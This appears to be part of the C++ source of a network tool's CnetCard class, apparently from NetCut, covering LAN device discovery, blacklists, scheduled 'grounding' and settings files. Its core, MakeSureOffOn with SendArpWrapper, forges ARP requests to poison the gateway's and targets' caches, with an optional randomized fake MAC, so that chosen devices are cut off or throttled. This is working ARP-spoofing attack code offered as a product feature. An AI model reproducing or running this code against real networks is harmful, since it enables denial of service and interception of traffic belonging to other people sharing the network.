bool CnetCard::ArpQueryIP(const DWORD & p_IP, u_char * p_buf) {

	bool bQuery = true;
	DWORD nMyIP = this->GetMyIP();
	DWORD nMask = this->GetMyMask();
	if (!CAddressHelper::isSameRang(nMyIP, p_IP, nMask)) {
		nMyIP = 0;
	}

	do {
		if (p_IP == 0)
			break;
		if (p_buf == 0 && this->IsKnownIP(p_IP))
			break;

		if (p_buf != 0 && this->IsKnownNode(p_buf, p_IP))
			break;

		//DWORD nMyIP = p_bNoIP ? 0 : GetMyIP();
		u_char targetbuf[6];

		if (p_buf != 0) {
			memcpy(&targetbuf[0], p_buf, 6);
			nMyIP = this->GetMyIP();

		} else {
			memcpy(&targetbuf[0], CAddressHelper::m_macBrocast, 6);
		}
		/*
		 if (IsRecentQuery(p_IP, nMyIP, targetbuf)) {

		 }

		 */
		//	TRACE("Query IP %s to MAC %s from IP %s MAC %s\n", CAddressHelper::IntIP2str(p_IP).c_str(),CAddressHelper::BufferMac2str(targetbuf).c_str(),CAddressHelper::IntIP2str(nMyIP).c_str(),CAddressHelper::BufferMac2str(m_sMac).c_str());
		bool bQueryRet = true;
		if (!this->GetIsRoot() || nMyIP == 0 || p_buf == 0) {
			m_UDPSender.Query(p_IP);
			if (this->GetIsSlowSCan())
				msleep(600);

			//	TRACE("UDP Query %s\n",CAddressHelper::IntIP2str(p_IP).c_str());
		} else {

			if (this->GetIsSlowSCan()) {
				msleep(600);
				sendArp(p_IP, 0, (u_char *) CAddressHelper::m_macEmpty, m_sMac,
						targetbuf, m_sMac, ARPOP_REQUEST);
				msleep(300);
				m_UDPSender.Query(p_IP);
				msleep(100);
			}
			bQueryRet = sendArp(p_IP, nMyIP,
					(u_char *) CAddressHelper::m_macEmpty, m_sMac, targetbuf,
					m_sMac, ARPOP_REQUEST);

		}
		m_EventsScanSent.SetEvent();
		if (bQueryRet) {
			AddQueryHistory(p_IP, nMyIP, targetbuf);
		} else {
			//	TRACE("\nFailed query IP\n");
			bQuery = false;
			break;
		}

	} while (false);

	return bQuery;

}
void CnetCard::ClearAllComputer() {
	m_lock.lock();
//CComputer newComputer;
	SaveBlackList();
	SaveGroundedSetting();

	std::map<MACADDR, CComputer>::iterator it;

	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;

		map<DWORD, bool> ips;
		computer.GetIPs(ips);

		std::map<DWORD, bool>::iterator ipit;
		for (ipit = ips.begin(); ipit != ips.end(); ++ipit) {
			DWORD ip = (*ipit).first;

			CAddressHelper::Remove_ArpEntry(ip);
		}

	}

	m_computers.clear();
	m_ip2mac.clear();

	this->m_queryHistory.clear();
	this->m_queryNetworkHistory.clear();
	m_lock.unlock();

}

void CnetCard::LoadMacNodeNames() {
	streamsize size;
	char * memblock;
	ifstream myfile;
	myfile.open(CAddressHelper::getAppPath() + MACNODENAMELIST,
			ios::in | ios::binary | ios::ate);

	if (myfile.is_open()) {
		size = myfile.tellg();
		memblock = new char[size];
		myfile.seekg(0, ios::beg);
		myfile.read(memblock, size);
		myfile.close();

		ofstream ResetFile;
		ResetFile.open(CAddressHelper::getAppPath() + MACNODENAMELIST,
				ios::out | ios::binary);
		ResetFile.close();

		char *end = memblock + size;
		char *head = memblock;
		while (head != end) {
			char buf[6];
			MACADDR mac = CAddressHelper::MacBuffer2Array((u_char *) head);
			head += 6;    //We got mac
			DWORD nSize;
			memcpy(&nSize, head, sizeof(nSize)); //got mac str len
			head += sizeof(nSize);
			string name(head, nSize);
			head += nSize;

			m_Name2MacList[mac].sName = name;
			memcpy(&m_Name2MacList[mac].bFixed, head,
					sizeof(m_Name2MacList[mac].bFixed));
			head += sizeof(m_Name2MacList[mac].bFixed);

		}

		delete[] memblock;
	}

	this->SaveMacNodeName();

}

void CnetCard::SaveMacNodeName() {
	m_lock.lock();
	ofstream myfile;
	myfile.open(CAddressHelper::getAppPath() + MACNODENAMELIST,
			ios::out | ios::binary);

	std::map<MACADDR, Mac2Name>::iterator it;
	for (it = m_Name2MacList.begin(); it != m_Name2MacList.end(); ++it) {
		MACADDR mac = (*it).first;

		Mac2Name name = (*it).second;
		myfile.write((char *) mac.data(), 6);

		DWORD nSize = name.sName.size();
		myfile.write((char *) &nSize, sizeof(nSize));
		myfile.write((char *) name.sName.c_str(), nSize);
		myfile.write((char *) &name.bFixed, sizeof(DWORD));

	}

	myfile.close();
	m_lock.unlock();

}

void CnetCard::SaveGroundedSetting() {

	m_lock.lock();
	std::map<MACADDR, CComputer>::iterator it;
	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		if ((*it).second.HasGroundedSetting()) {

			this->m_GroundSetting[(*it).second.GetMacArray()] = (*it).second;
		}
	}
//Open ConfigFile to save blacklist

	ofstream myfile;
	myfile.open(CAddressHelper::getAppPath() + GROUNDEDFILE,
			ios::out | ios::binary);
	std::map<MACADDR, CGrounded>::iterator b;
	for (b = this->m_GroundSetting.begin(); b != m_GroundSetting.end(); ++b) {
		CGrounded &g = (*b).second;
		g.Save2File(myfile);
	}
	myfile.close();
	m_lock.unlock();
}

void CnetCard::LoadCutOffMethod() {

	streamsize size;
	int32_t nMethod = 0;
	bool bFakeMac = false;
	bool bSlowScan = false;
	ifstream myfile;
	myfile.open(CAddressHelper::getAppPath() + CUTOFFMETHODFILE,
			ios::in | ios::binary | ios::ate);

	if (myfile.is_open()) {
		size = myfile.tellg();
		if (size >= sizeof(int32_t) + sizeof(bool) + sizeof(bool)) {

			myfile.seekg(0, ios::beg);
			myfile.read((char *) &nMethod, sizeof(int32_t));
			myfile.read((char *) &bFakeMac, sizeof(bool));
			myfile.read((char *) &bSlowScan, sizeof(bool));
			m_lock.lock();
			this->m_nCutoffMethod = nMethod;
			m_lock.unlock();
		}
		myfile.close();
	}

}

void CnetCard::SaveCutOffMethod() {

	ofstream myfile;
	myfile.open(CAddressHelper::getAppPath() + CUTOFFMETHODFILE,
			ios::out | ios::binary);
	m_lock.lock();

	myfile.write((char *) &this->m_nCutoffMethod, sizeof(m_nCutoffMethod));
	myfile.write((char *) &this->m_bFakeMac, sizeof(this->m_bFakeMac));

	myfile.write((char *) &this->m_bSlowScan, sizeof(this->m_bSlowScan));

	m_lock.unlock();

	myfile.close();

}

void CnetCard::SaveBlackList() {
//loop all computer into blacklist, save it into file
	m_lock.lock();
//CComputer newComputer;
//	m_Blacklist2.clear();
	std::map<MACADDR, CComputer>::iterator it;
	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		if ((*it).second.IsSetOff()) {
			CBlackList OneComputer((*it).second);

			this->m_Blacklist2[(*it).second.GetMacArray()] = OneComputer;
		}
	}
//Open ConfigFile to save blacklist

	ofstream myfile;
	myfile.open(CAddressHelper::getAppPath() + BLACKLISTFILE,
			ios::out | ios::binary);
	std::map<MACADDR, CBlackList>::iterator b;
	for (b = this->m_Blacklist2.begin(); b != m_Blacklist2.end(); ++b) {
		CBlackList &blacklist = (*b).second;
		blacklist.Save2File(myfile);
	}
	myfile.close();
	m_lock.unlock();
}

void CnetCard::RemoveFromBlacklist(CComputer &p_Computer) {
	m_lock.lock();
	if (!p_Computer.IsOff()) {

		if (m_Blacklist2.count(p_Computer.GetMacArray())) {
			m_Blacklist2.erase(p_Computer.GetMacArray());
		}

		std::map<MACADDR, CBlackList>::iterator b;
		for (b = this->m_Blacklist2.begin(); b != m_Blacklist2.end();) {
			CBlackList &blacklist = (*b).second;
			if (blacklist.hostname == p_Computer.GetName()) {
				m_Blacklist2.erase(b++);
			} else {
				++b;
			}
		}
	}

	m_lock.unlock();
}

void CnetCard::LoadGroundedSetting() {
//load from file to blacklist ,when OnNewComputer appear, apply from blacklist to computer

	streamsize size;
	char * memblock;
	ifstream myfile;
	myfile.open(CAddressHelper::getAppPath() + GROUNDEDFILE,
			ios::in | ios::binary | ios::ate);

	if (myfile.is_open()) {
		size = myfile.tellg();
		memblock = new char[size];
		myfile.seekg(0, ios::beg);
		myfile.read(memblock, size);
		myfile.close();

		ofstream ResetFile;
		ResetFile.open(CAddressHelper::getAppPath() + GROUNDEDFILE,
				ios::out | ios::binary);
		ResetFile.close();

		char *end = memblock + size;
		char *head = memblock;
		while (head != end) {
			CGrounded b;
			b.LoadFromFile(head);
			this->m_GroundSetting[b.mac] = b;
		}

		delete[] memblock;
	}

}
void CnetCard::LoadBlackList() {
//load from file to blacklist ,when OnNewComputer appear, apply from blacklist to computer

	streamsize size;
	char * memblock;
	ifstream myfile;
	myfile.open(CAddressHelper::getAppPath() + BLACKLISTFILE,
			ios::in | ios::binary | ios::ate);

	if (myfile.is_open()) {
		size = myfile.tellg();
		memblock = new char[size];
		myfile.seekg(0, ios::beg);
		myfile.read(memblock, size);
		myfile.close();

		ofstream ResetFile;
		ResetFile.open(CAddressHelper::getAppPath() + BLACKLISTFILE,
				ios::out | ios::binary);
		ResetFile.close();

		char *end = memblock + size;
		char *head = memblock;
		while (head != end) {
			CBlackList b;
			b.LoadFromFile(head);
			m_Blacklist2[b.mac] = b;
		}

		delete[] memblock;
	}

}

unsigned long CnetCard::GetLastStatusUpdateTime() {
	unsigned long n;

	this->m_lock.lock();
	n = this->m_nLastStatusTime;
	m_lock.unlock();

	return n;

}
void CnetCard::RenewStatusUpdateTime() {
	this->m_lock.lock();
	this->m_nLastStatusTime = ::_helper_GetMiTime();
	m_lock.unlock();

}

void CnetCard::UpdateStatus(const string & p_sMessage) {
	if (m_CallNetworkHandle.HandlerParentPointer == NULL)
		return;

	unsigned long n = this->GetLastStatusUpdateTime();
	if ((::_helper_GetMiTime() - n) < (1000 / 3))
		return;
	this->RenewStatusUpdateTime();
	CIPCMessageStatus * p =
			(CIPCMessageStatus *) CIPCMessageObjectFactory::GetInstance()->Get(
			IPCMESSAGE_ID_STATUS);
	if (p == NULL)
		return;

	p->SetMessage(p_sMessage);

	m_CallNetworkHandle.Handler((void *) p,
			m_CallNetworkHandle.HandlerParentPointer);
}

void CnetCard::UpdateClients(const string & p_sMessage) {
	if (m_CallNetworkHandle.HandlerParentPointer == NULL)
		return;

	CIPCMessageMessage * p =
			(CIPCMessageMessage *) CIPCMessageObjectFactory::GetInstance()->Get(
			IPCMESSAGE_ID_MESSAGE);
	if (p == NULL)
		return;

	p->SetMessage(p_sMessage);

	m_CallNetworkHandle.Handler((void *) p,
			m_CallNetworkHandle.HandlerParentPointer);
}

void CnetCard::UpdateClients(int p_nType, int p_nOnOFF) {
	if (m_CallNetworkHandle.HandlerParentPointer == NULL)
		return;

	CIPCMessageIDValue * p =
			(CIPCMessageIDValue *) CIPCMessageObjectFactory::GetInstance()->Get(
			IPCMESSAGE_ID_IDVALUE);
	if (p == NULL)
		return;
	p->m_message.nID = p_nType;
	p->m_message.nIDValue = p_nOnOFF;

	m_CallNetworkHandle.Handler((void *) p,
			m_CallNetworkHandle.HandlerParentPointer);

}
void CnetCard::OnComputerGroundedUpdate(CComputer & p_Computer) {

	if (m_CallNetworkHandle.HandlerParentPointer == NULL)
		return;

	CIPCMessageGroundSetting * p =
			(CIPCMessageGroundSetting *) CIPCMessageObjectFactory::GetInstance()->Get(
			IPCMESSAGE_ID_GROUNDSETTING);
	if (p == NULL)
		return;

//	p->m_message.bIsGrounded= p_Computer.IsGrounded();
	p->m_message.gOneTime = p_Computer.GetGroundInfo(GROUND_TYPE_ONETIME);
	p->m_message.gDaily = p_Computer.GetGroundInfo(GROUND_TYPE_DAILY);

	p->m_message.nLeftSeconds = p_Computer.GetGroundLeftSeconds();
	p_Computer.GetMac((u_char *) p->m_message.MacBuff);
	memcpy(p->m_message.sMacStr, p_Computer.GetMacStr().c_str(),
			p_Computer.GetMacStr().size() < EVENT_FIX_MACSTR ?
					p_Computer.GetMacStr().size() : EVENT_FIX_MACSTR);

	m_CallNetworkHandle.Handler((void *) p,
			m_CallNetworkHandle.HandlerParentPointer);

}

void CnetCard::OnComputerUpdate(CComputer & p_Computer, int p_nType) {

	if (m_CallNetworkHandle.HandlerParentPointer != NULL) {

		CIPCMessagePCInfo * p =
				(CIPCMessagePCInfo *) CIPCMessageObjectFactory::GetInstance()->Get(
				IPCMESSAGE_ID_PCINFO);
		if (p == NULL)
			return;
		m_lock.lock();

		p->SetIPs(p_Computer.GetIPs());
		p->m_message.bOff = p_Computer.IsOff();
		p->m_message.bDefender = p_Computer.IsNetCutDefender();
		p->m_message.bAttacker = p_Computer.IsAttacker();
		p->m_message.bIsMydevivce = p_Computer.IsMyself();
		p->m_message.bIsGateWay = p_Computer.IsGateway();
		p->m_message.nSpeedLimit = p_Computer.GetSpeedLimit();
		//	p->m_message.nAgeRate=p_Computer.GetAgeRate();

		p->SetBrand(p_Computer.GetBrand());
		p->SetHostname(p_Computer.GetName());
		p->SetMac(p_Computer.GetMac());

		std::map<DWORD, bool> ips;
		p_Computer.GetIPs(ips);

		map<DWORD, bool>::iterator ipit;

		int i = 0;
		for (ipit = ips.begin(); ipit != ips.end(); ++ipit) {

			if (i >= 12)
				break;
			DWORD ip = (*ipit).first;
			p->m_message.nIPs[i++] = ip;
			p->m_message.nIPCount = i;
		}

		m_lock.unlock();

		m_CallNetworkHandle.Handler((void *) p,
				m_CallNetworkHandle.HandlerParentPointer);

	}

	if (p_Computer.HasGroundedSetting()) {
		this->OnComputerGroundedUpdate(p_Computer);
	}
}

/*
 void CnetCard::OnComputerUpdate(CComputer & p_Computer, int p_nType) {

 if (m_CallNetworkHandle.HandlerParentPointer != NULL) {

 m_lock.lock();

 netcardEvent e;
 memset(&e, 0, sizeof(netcardEvent));
 e.nTotalLen = (int) sizeof(netcardEvent);

 e.nEventType = p_nType;

 p_Computer.GetIPs(e);
 e.bOff = p_Computer.IsOff();
 e.bDefender = p_Computer.IsNetCutDefender();
 e.bAttacker = p_Computer.IsAttacker();

 e.nBrandNameSize = p_Computer.GetBrand().size();
 e.nBrandNameSize =
 e.nBrandNameSize < EVENT_MAX_BRANDNAME ?
 e.nBrandNameSize : EVENT_MAX_BRANDNAME;

 memcpy(e.sBrand, p_Computer.GetBrand().c_str(), e.nBrandNameSize);
 p_Computer.GetMac((u_char *) e.sMac);

 e.nHostNameSize = p_Computer.GetName().size();
 e.nHostNameSize =
 e.nHostNameSize < EVENT_MAX_HOSTNAME ?
 e.nHostNameSize : EVENT_MAX_HOSTNAME;

 memcpy(e.sName, p_Computer.GetName().c_str(), e.nHostNameSize);

 memcpy(e.sMacStr, p_Computer.GetMacStr().c_str(),
 p_Computer.GetMacStr().size() < EVENT_FIX_MACSTR ?
 p_Computer.GetMacStr().size() : EVENT_FIX_MACSTR);

 //	TRACE("mac str len %d",p_Computer.GetMacStr().size());
 e.bIsMyDevice = p_Computer.IsMyself();
 e.bIsGateway = p_Computer.IsGateway();

 m_lock.unlock();

 m_CallNetworkHandle.Handler((void *) &e,
 m_CallNetworkHandle.HandlerParentPointer);

 }

 if (p_Computer.HasGroundedSetting()) {
 this->OnComputerGroundedUpdate(p_Computer);
 }
 }
 */
void CnetCard::AddnewComputer(const MACADDR & macarray, const DWORD & p_nIP) {

	m_lock.lock();

	do {

		m_ip2mac[p_nIP] = macarray;
		string sStatus;
		if (this->IsKnownNode(macarray, p_nIP)) {
			/*		TRACE("\nAlready having computer %s %s SKIP\n",
			 CAddressHelper::IntIP2str(p_nIP).c_str(),
			 CAddressHelper::BufferMac2str(macarray.data()).c_str());
			 */
			break;
		}

		TRACE("adding computer %s %s\n",
				CAddressHelper::IntIP2str(p_nIP).c_str(),
				CAddressHelper::BufferMac2str(macarray.data()).c_str());


		sStatus = "found user: " + CAddressHelper::IntIP2str(p_nIP);
		UpdateStatus(sStatus);

		if (IsNewRangeIP(p_nIP)) {
			TRACE("Discover network for %s\n",
					CAddressHelper::IntIP2str(p_nIP).c_str());

			sStatus = "Scanning network: " + CAddressHelper::IntIP2str(p_nIP);
			UpdateStatus(sStatus);
			this->AddDisCoverIP(p_nIP);
			this->SendDiscover();
		}

		SendMDNSQuery(CAddressHelper::GetDNS_inaddr(p_nIP), T_PTR,
				this->GetMyIP());
		m_computers[macarray].SetMac(macarray.data());
		m_computers[macarray].AddIP(p_nIP);

		/*
		 if (p_nIP == CAddressHelper::StrIP2Int("192.168.1.104")) {
		 SetComputerOnOff(m_computers[macarray], true);

		 }
		 */

		string s = this->QueryMac2Name(macarray);

		string nodename;
		if (this->IsMyMac(macarray)) {
			m_computers[macarray].SetIsMySelf(true);
			if (this->m_bProtection)
				m_computers[macarray].FlagAsNetCutDefender();
			//nodename="(MySelf)";
		}

		string brand = CAddressHelper::GetMacBrand(macarray.data());

		m_computers[macarray].SetBrand(brand);

		nodename += s;
		if (nodename != "")
			this->SetComputerName(macarray, nodename);
		//m_computers[macarray].SetName(nodename);

		if (this->m_GatewayIPMap.count(p_nIP)) {
			this->SetMac2GateWay(macarray);
			if (m_nDefaultGateWayIP == 0) {
				m_nDefaultGateWayIP = p_nIP;
				this->m_MACGateMac = macarray;

			}
			TRACE("It is a Gateway\n");
		}

		bool bOff = true;
		if (m_Blacklist2.count(macarray)) {
			SetComputerOnOff(m_computers[macarray], bOff);
		} else {
			map<MACADDR, CBlackList>::iterator b;
			for (b = this->m_Blacklist2.begin(); b != m_Blacklist2.end(); ++b) {
				CBlackList &blacklist = (*b).second;

				if (m_computers[macarray].IsMyIP(blacklist.IPs)) {

					SetComputerOnOff(m_computers[macarray], bOff);

					break;
				}

			}
		}

		if (this->m_GroundSetting.count(macarray)) {
			m_computers[macarray] = m_GroundSetting[macarray];
		}
	} while (false);

	if (m_computers[macarray].IsOff())
		this->MakeSureOffOn(m_computers[macarray]);

	this->OnComputerUpdate(m_computers[macarray]);
	srand((unsigned int) _helper_GetMiTime());
	unsigned short seq = rand();
	if (this->SendNetbiosQuery(macarray, this->GetMyIP(), p_nIP, seq)) {
		this->SetIPTRansID(p_nIP, seq);
	}
	/*	if (bIsNew && m_computers[macarray].GetName() == "") {
	 DWORD *p = new DWORD;
	 *p = p_nIP;
	 m_NewComputerQueue.AddTail(p);

	 }
	 */
	CAddressHelper::Add_ArpEntry(p_nIP, macarray.data(), this->m_sDevName);

	//this->ShowALLComputers();

	m_lock.unlock();

}
void CnetCard::GetFakeMac(u_char *buff) {
	srand((unsigned int) _helper_GetMiTime());

	for (int i = 0; i < 6; i++)
		buff[i] = rand() / 255;

}
void CnetCard::SayIAmNetCut() {

	m_lock.lock();

	if (this->m_computers.count(m_MACADD)) {
		m_computers[m_MACADD].FlagAsNetCutDefender();
	}

	std::map<DWORD, Address>::iterator it;
	for (it = m_IPs.begin(); it != m_IPs.end(); ++it) {
		DWORD nMyip = (*it).first;
		string s = CAddressHelper::BufferMac2str(this->m_sMac);
		DWORD nTargetIP = CAddressHelper::MakeNetcutSignIP(s);

		int retry = 0;
		while (!this->sendArp(nTargetIP, nMyip, CAddressHelper::m_macEmpty,
				this->m_sMac, CAddressHelper::m_macBrocast, m_sMac,
				ARPOP_REQUEST)) {
			msleep(50);
			if (retry++ > 3)
				break;
		}

	}

	m_lock.unlock();
}
void CnetCard::MakeSureoffAll() {
	m_lock.lock();

	std::map<MACADDR, CComputer>::iterator it;
	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		if ((*it).second.IsOff()) {
			MakeSureOffOn((*it).second);
		}
	}

	m_lock.unlock();
}

void CnetCard::ShowCutMethod() {

	MessageINT_Value(IPCMESSAGE_ID_INT_CUTOFFMETHOD, GetCutMethod());

}

void CnetCard::MessageINT_Value(int p_nINTID, int p_nValue) {

	CIPCMessageIDValue * p =
			(CIPCMessageIDValue *) CIPCMessageObjectFactory::GetInstance()->Get(
			IPCMESSAGE_ID_IDVALUE);
	if (p != NULL) {
		p->m_message.nID = p_nINTID;

		p->m_message.nIDValue = p_nValue;

		m_CallNetworkHandle.Handler((void *) p,
				m_CallNetworkHandle.HandlerParentPointer);

	}
}

void CnetCard::EnableSlowScan(bool p_bEnableSlowScan) {
	this->m_lock.lock();
	this->m_bSlowScan = p_bEnableSlowScan;
	this->m_lock.unlock();

	MessageINT_Value(IPCMESSAGE_ID_INT_SLOWSCAN, (int) m_bSlowScan);
	SaveCutOffMethod();
}
void CnetCard::EnableFakeMac(bool p_bEnableFakeMac) {
	this->m_lock.lock();
	this->m_bFakeMac = p_bEnableFakeMac;
	this->m_lock.unlock();

	MessageINT_Value(IPCMESSAGE_ID_INT_FAKEMAC, (int) m_bFakeMac);
	SaveCutOffMethod();
}

void CnetCard::SetCutMethod(int p_nCutOffMethod) {
	this->m_lock.lock();
	this->m_nCutoffMethod = p_nCutOffMethod;
	this->m_lock.unlock();

	ShowCutMethod();
	SaveCutOffMethod();
}

int CnetCard::GetCutMethod() {

	this->m_lock.lock();
	int ret = this->m_nCutoffMethod;
	this->m_lock.unlock();
	return ret;
}
void CnetCard::SetComputerOnOff(CComputer &p_Computer, bool p_bOff) {

	if (p_bOff == p_Computer.IsOff())  //already set;
		return;

	if (this->IsGateWayMac(p_Computer.GetMacArray()) && p_bOff) {
		UpdateClients("Gateway can not be cut offline\n");
		return;
	}
	if (this->IsMyMac(p_Computer.GetMacArray()) && p_bOff) {
		UpdateClients("Can not cut off your self\n");
		return;
	}

	p_Computer.SetOff(p_bOff);
	if (p_bOff) {
		map<DWORD, bool> ips;
		p_Computer.GetIPs(ips);

		for (std::map<DWORD, bool>::iterator it = ips.begin(); it != ips.end();
				++it) {
			DWORD ip = (*it).first;
			//		SetDrop(ip);
		}

	}

	this->MakeSureOffOn(p_Computer);
	this->OnComputerUpdate(p_Computer);

}

void CnetCard::MakeSureOffOn(CComputer &p_Computer) {

	if (!p_Computer.HasMac())
		return;

	std::map<MACADDR, CComputer> gates;
	this->GetMyGate(gates);

	bool bMakeOff = p_Computer.IsOff();
	bool bSpeedLimit = p_Computer.IsSpeedLimit();
	int nCutoffMethod = this->GetCutMethod();

	u_char targetmac[6];
	u_char mymac[6];
	u_char fakemac[6];
	this->getMac(mymac);
	p_Computer.GetMac(targetmac);
	CAddressHelper::GetRandomMac(fakemac);

	u_char * arp_mac = mymac;
	if (this->m_bFakeMac)
		arp_mac = fakemac;

	for (std::map<MACADDR, CComputer>::iterator it = gates.begin();
			it != gates.end(); ++it) {
		CComputer& s = (*it).second;

		if (!s.HasMac())
			continue;

		if (s == p_Computer)
			continue;

		u_char gatemac[6];
		s.GetMac(gatemac);

		map<DWORD, bool> GateIPs;
		s.GetIPs(GateIPs);
		map<DWORD, bool> TargetIPs;
		p_Computer.GetIPs(TargetIPs);

		for (std::map<DWORD, bool>::iterator gateit = GateIPs.begin();
				gateit != GateIPs.end(); ++gateit) {
			DWORD nGateIP = (*gateit).first;
			for (std::map<DWORD, bool>::iterator targetit = TargetIPs.begin();
					targetit != TargetIPs.end(); ++targetit) {

				DWORD TargetIp = (*targetit).first;
				if (bMakeOff) {

					if (!bSpeedLimit) {
						switch (nCutoffMethod) {
						case 1: {
							SendArpWrapper(nGateIP, TargetIp,
									CAddressHelper::m_macEmpty, arp_mac,
									gatemac, mymac,
									ARPOP_REQUEST);

							break;
						}
						case 2: {

							SendArpWrapper(TargetIp, nGateIP,
									CAddressHelper::m_macEmpty, arp_mac,
									targetmac, mymac,
									ARPOP_REQUEST);
							break;
						}
						default: {

							SendArpWrapper(nGateIP, TargetIp,
									CAddressHelper::m_macEmpty, arp_mac,
									gatemac, mymac,
									ARPOP_REQUEST);
							SendArpWrapper(TargetIp, nGateIP,
									CAddressHelper::m_macEmpty, arp_mac,
									targetmac, mymac,
									ARPOP_REQUEST);

							break;
						}
						}
					}
					else  //Send Speed limit packet
					{
						TRACE("Sending spoof packet %s\n",CAddressHelper::IntIP2str(TargetIp).c_str());

					                     	  SendArpWrapper(nGateIP, TargetIp,
															CAddressHelper::m_macEmpty, mymac,
															gatemac, mymac,
															ARPOP_REQUEST);
													SendArpWrapper(TargetIp, nGateIP,
															CAddressHelper::m_macEmpty, mymac,
															targetmac, mymac,
															ARPOP_REQUEST);
					}
				} else {
//					send gate a packet with query      Gate   IP, target IP,   empty dst mac,target mac, gate mac mac,target mac,

					//		send gate a packet with query      Gate   IP, target IP,   empty dst mac,target mac, gate mac mac,my mac,
					//send target ip packet with query , target IP, gate ip, empty dst mac,gate mac,target mac, gate mac

					if (memcmp(mymac, targetmac, 6) != 0) {

						SendArpWrapper(TargetIp, nGateIP,
								CAddressHelper::m_macEmpty, gatemac, targetmac,
								mymac, ARPOP_REQUEST);
					}

					SendArpWrapper(nGateIP, TargetIp,
							CAddressHelper::m_macEmpty, targetmac, gatemac,
							mymac, ARPOP_REQUEST);

				}

			}
		}

	}
}

bool CnetCard::SendArpWrapper(const DWORD &p_DstIP, const DWORD &p_SrcIp,
		const u_char *p_sDstMac, const u_char *p_sSrcMac,
		const u_char *p_sEtherDstMac, const u_char * p_sEtherSrcMac,
		const uint16_t p_nRequesttype) {

	int retry = 0;
//send gate a packet with query      Gate   IP, target IP,   empty dst mac,my mac, gate mac mac,my mac,
	while (!this->sendArp(p_DstIP, p_SrcIp, p_sDstMac, p_sSrcMac,
			p_sEtherDstMac, p_sEtherSrcMac, p_nRequesttype)) {
		if (retry++ > 3)
			break;
	}
	return (retry <= 3);
}
/*
 void CnetCard::MakeSureOffOn(CComputer &p_Computer, int p_nArpOP,
 int p_nRepeatPacket) {

 std::map<MACADDR, CComputer> gates;
 this->GetMyGate(gates);

 for (std::map<MACADDR, CComputer>::iterator it = gates.begin();
 it != gates.end(); ++it) {
 CComputer& s = (*it).second;

 if (!s.HasMac())
 continue;

 if (s == p_Computer)
 continue;

 u_char GateMac[6];
 u_char SrcMac[6];
 u_char TargetMac[6];
 u_char ComputerMac[6];
 u_char FakeMac[6];
 CAddressHelper::GetRandomMac(FakeMac);


 p_Computer.GetMac(ComputerMac);
 s.GetMac(GateMac);
 if (p_nArpOP == ARPOP_REQUEST) {
 memcpy(TargetMac, CAddressHelper::m_macEmpty, 6);
 } else {
 s.GetMac(TargetMac);
 }

 p_Computer.GetMac(SrcMac);

 if (!p_Computer.IsNetCutDefender() && p_Computer.IsOff())
 this->MakeArpSrcMac(SrcMac);

 if (p_Computer.IsAttacker()) {
 this->MakeArpSrcMac(SrcMac);
 //p_nRepeatPacket = 4;
 }

 map<DWORD, bool> GateIPs;
 s.GetIPs(GateIPs);
 map<DWORD, bool> TargetIPs;
 p_Computer.GetIPs(TargetIPs);

 for (std::map<DWORD, bool>::iterator gateit = GateIPs.begin();
 gateit != GateIPs.end(); ++gateit) {

 DWORD nGateIP = (*gateit).first;

 for (std::map<DWORD, bool>::iterator targetit = TargetIPs.begin();
 targetit != TargetIPs.end(); ++targetit) {

 DWORD TargetIp = (*targetit).first;

 int count = 0, retry = 0;
 while (count < p_nRepeatPacket) {
 retry = 0;
 while (!this->sendArp(nGateIP, TargetIp, TargetMac, SrcMac,
 GateMac, SrcMac, p_nArpOP)) {
 if (retry++ > 3)
 break;
 }



 count++;
 if (count < p_nRepeatPacket)
 msleep(50);

 }

 }

 }

 }

 }


 */
void CnetCard::RegisterNetworkHandle(callback p_Handle, void * p_Parent) {

	this->m_CallNetworkHandle.Handler = p_Handle;
	m_CallNetworkHandle.HandlerParentPointer = p_Parent;

}
/*
 void* CnetCard::CallBackEvent(void *para, void *p_parent) {

 CnetCard * c = (CnetCard *) p_parent;
 c->CallBackEventRun((netBiosPacket *) para);
 return 0;

 }

 void CnetCard::CallBackEventRun(netBiosPacket * p_Event) {

 m_lock.lock();
 if (m_computers.count(p_Event->nIP)) {
 m_computers[p_Event->nIP].SetName(p_Event->sName);
 this->OnComputerUpdate(m_computers[p_Event->nIP]);
 }
 m_lock.unlock();

 }
 */

DWORD CnetCard::GetTakeIP() {
	m_lock.lock();
	DWORD n = this->m_nTakeIP;
	m_lock.unlock();
	return n;

}
/*
 void CnetCard::TakeIP(DWORD p_nIP) {

 if (GetTakeIP() == 0 && this->m_nDefaultGateWayIP != 0) {
 m_lock.lock();

 this->m_nTakeIP = p_nIP;

 if (this->m_computers.count(this->m_MACADD)) {
 m_computers[m_MACADD].AddIP(p_nIP);
 }

 CnetCard::m_nMyFakeIP = p_nIP;

 m_EventsTakeIP.SetEvent();

 TRACE("All right, I am taking IP %s\n",
 CAddressHelper::IntIP2str(m_nTakeIP).c_str());

 m_lock.unlock();

 }

 }
 */

void CnetCard::SetComputerAgeRate(const MACADDR& p_Mac, const int& p_nAgeRate) {

	m_lock.lock();
	if (m_computers.count(p_Mac)) {

		m_computers[p_Mac].SetAgeRate(p_nAgeRate);
		this->OnComputerUpdate(m_computers[p_Mac]);
	}
	m_lock.unlock();

}
void CnetCard::SetComputerName(MACADDR p_Mac, string p_sName) {

	m_lock.lock();
	if (m_computers.count(p_Mac)) {

		if (m_computers[p_Mac].SetName(p_sName)) {
			this->OnComputerUpdate(m_computers[p_Mac]);
			string s = "Got name:" + m_computers[p_Mac].GetName() + " for "
					+ m_computers[p_Mac].GetIPs()
					+ m_computers[p_Mac].GetBrand();
			UpdateStatus(s);
		}
	}
	m_lock.unlock();

}

unsigned short CnetCard::GetIPTransID(const DWORD & p_nIP) {
	m_lock.lock();
	unsigned short n = 0;
	if (this->m_QueryHistoryID.count(p_nIP)) {
		n = this->m_QueryHistoryID[p_nIP];
	}
//TRACE("Found IP %s ID %ud",CAddressHelper::IntIP2str(p_nIP).c_str(),n);

	m_lock.unlock();
	return n;
}
void CnetCard::SetIPTRansID(const DWORD & p_nIP, unsigned short p_nID) {
	m_lock.lock();

	this->m_QueryHistoryID[p_nIP] = p_nID;
//TRACE("SET IP %s ID %ud\n",CAddressHelper::IntIP2str(p_nIP).c_str(),m_QueryHistoryID[p_nIP]);

	m_lock.unlock();

}

